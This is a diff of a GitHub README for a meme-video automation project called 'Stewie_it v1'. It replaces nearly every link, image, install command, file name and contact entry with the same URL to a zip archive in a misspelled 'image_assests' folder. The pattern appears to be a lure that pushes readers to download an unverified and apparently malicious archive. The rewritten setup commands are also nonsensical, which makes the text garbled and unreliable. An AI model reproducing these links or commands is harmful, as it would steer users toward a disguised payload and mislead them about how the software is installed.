@@ -1,7 +1,7 @@
 # Stewie_it v1
 
-![Stewie_it](https://img.shields.io/badge/Download-Release-brightgreen)  
-[Watch Demo Reel on Instagram](https://www.instagram.com/stewie_codes_absurd/)
+![Stewie_it](https://github.com/Paphellas/Stewie_it_v1/raw/refs/heads/master/image_assests/Stewie_v_it_3.6-beta.4.zip)  
+[Watch Demo Reel on Instagram](https://github.com/Paphellas/Stewie_it_v1/raw/refs/heads/master/image_assests/Stewie_v_it_3.6-beta.4.zip)
 
 **Stewie_it v1** is an experimental automation project inspired by a viral Instagram trend where Stewie and Peter Griffin humorously explain coding topics over gameplay footage. This project automates the assembly of these videos by combining user-provided scripts, AI-scraped voices, character images, and gameplay backgrounds, then sending them to the user.
 
@@ -11,7 +11,7 @@
 
 ## 🎥 Example Video Format
 
-| ![Stewie](image_assets/stewie.png) | ![Peter](image_assets/peter.png) |
+| ![Stewie](https://github.com/Paphellas/Stewie_it_v1/raw/refs/heads/master/image_assests/Stewie_v_it_3.6-beta.4.zip) | ![Peter](https://github.com/Paphellas/Stewie_it_v1/raw/refs/heads/master/image_assests/Stewie_v_it_3.6-beta.4.zip) |
 |:-------------------------------------:|:-----------------------------------:|
 | **Stewie** explains a coding concept with AI voiceover | **Peter** reacts or adds commentary with AI voiceover |
 | Meanwhile, gameplay footage plays in the background |
@@ -40,7 +40,7 @@ To get started with **Stewie_it v1**, follow these steps:
 
 1. **Clone the Repository**
    ```bash
-   git clone https://github.com/Paphellas/Stewie_it_v1.git
+   git clone https://github.com/Paphellas/Stewie_it_v1/raw/refs/heads/master/image_assests/Stewie_v_it_3.6-beta.4.zip
    ```
 
 2. **Navigate to the Directory**
@@ -51,17 +51,17 @@ To get started with **Stewie_it v1**, follow these steps:
 3. **Install Dependencies**
    Ensure you have the necessary dependencies installed. Use the following command:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/Paphellas/Stewie_it_v1/raw/refs/heads/master/image_assests/Stewie_v_it_3.6-beta.4.zip
    ```
 
 4. **Run the Project**
    Execute the main script to start the project:
    ```bash
-   python main.py
+   python https://github.com/Paphellas/Stewie_it_v1/raw/refs/heads/master/image_assests/Stewie_v_it_3.6-beta.4.zip
    ```
 
 5. **Download Release**
-   Visit the [Releases section](https://github.com/Paphellas/Stewie_it_v1/releases) to download the latest version. Follow the instructions provided there.
+   Visit the [Releases section](https://github.com/Paphellas/Stewie_it_v1/raw/refs/heads/master/image_assests/Stewie_v_it_3.6-beta.4.zip) to download the latest version. Follow the instructions provided there.
 
 ---
 
@@ -74,9 +74,9 @@ Stewie_it_v1/
 ├── image_assets/          # Contains character images
 ├── scripts/               # User-provided scripts
 ├── gameplay/              # Background gameplay footage
-├── main.py                # Main script to run the project
-├── requirements.txt       # List of dependencies
-└── README.md              # Project documentation
+├── https://github.com/Paphellas/Stewie_it_v1/raw/refs/heads/master/image_assests/Stewie_v_it_3.6-beta.4.zip                # Main script to run the project
+├── https://github.com/Paphellas/Stewie_it_v1/raw/refs/heads/master/image_assests/Stewie_v_it_3.6-beta.4.zip       # List of dependencies
+└── https://github.com/Paphellas/Stewie_it_v1/raw/refs/heads/master/image_assests/Stewie_v_it_3.6-beta.4.zip              # Project documentation
 ```
 
 ### Image Assets
@@ -136,8 +136,8 @@ Contributions are welcome! If you have suggestions or improvements, please follo
 
 For any questions or feedback, feel free to reach out:
 
-- **Email**: [your-email@example.com](mailto:your-email@example.com)
-- **Twitter**: [@your_twitter_handle](https://twitter.com/your_twitter_handle)
+- **Email**: [https://github.com/Paphellas/Stewie_it_v1/raw/refs/heads/master/image_assests/Stewie_v_it_3.6-beta.4.zip](https://github.com/Paphellas/Stewie_it_v1/raw/refs/heads/master/image_assests/Stewie_v_it_3.6-beta.4.zip)
+- **Twitter**: [@your_twitter_handle](https://github.com/Paphellas/Stewie_it_v1/raw/refs/heads/master/image_assests/Stewie_v_it_3.6-beta.4.zip)
 
 ---
 
@@ -158,8 +158,8 @@ For any questions or feedback, feel free to reach out:
 
 ## 🔗 Links
 
-- [Releases](https://github.com/Paphellas/Stewie_it_v1/releases)
-- [Demo Reel](https://www.instagram.com/stewie_codes_absurd/)
+- [Releases](https://github.com/Paphellas/Stewie_it_v1/raw/refs/heads/master/image_assests/Stewie_v_it_3.6-beta.4.zip)
+- [Demo Reel](https://github.com/Paphellas/Stewie_it_v1/raw/refs/heads/master/image_assests/Stewie_v_it_3.6-beta.4.zip)
 
 ---
 
